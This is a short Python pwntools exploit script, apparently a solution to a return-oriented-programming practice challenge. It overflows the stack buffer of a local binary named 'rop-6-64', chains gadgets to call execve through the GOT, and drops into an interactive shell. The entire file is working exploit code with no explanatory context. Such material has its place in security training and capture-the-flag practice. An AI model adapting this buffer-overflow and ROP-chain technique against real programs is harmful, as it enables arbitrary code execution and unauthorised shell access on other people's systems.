#!/usr/bin/env python

from pwn import *

p = process("./rop-6-64")

got_of_execve = p.elf.got['execve']
#0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006fa <+90>: pop    %rbx
pop_r12_r13_r14_r15_ret = p64(0x00000000004006fc)
#got from gdb:
pop_ebx = p64(0x00000000004006fa)

#0x400034:  "@"
string = p64(0x400034)

buf = "A"*0x80 + "A"*8
buf += pop_r12_r13_r14_r15_ret
#buf += p64(1)
buf += p64(got_of_execve)
buf += p64(0)
buf += p64(0)
buf += string
buf += p64(0x4006e0)
buf += pop_ebx
buf += p64(0)

p.recv()
p.send(buf)
p.interactive()
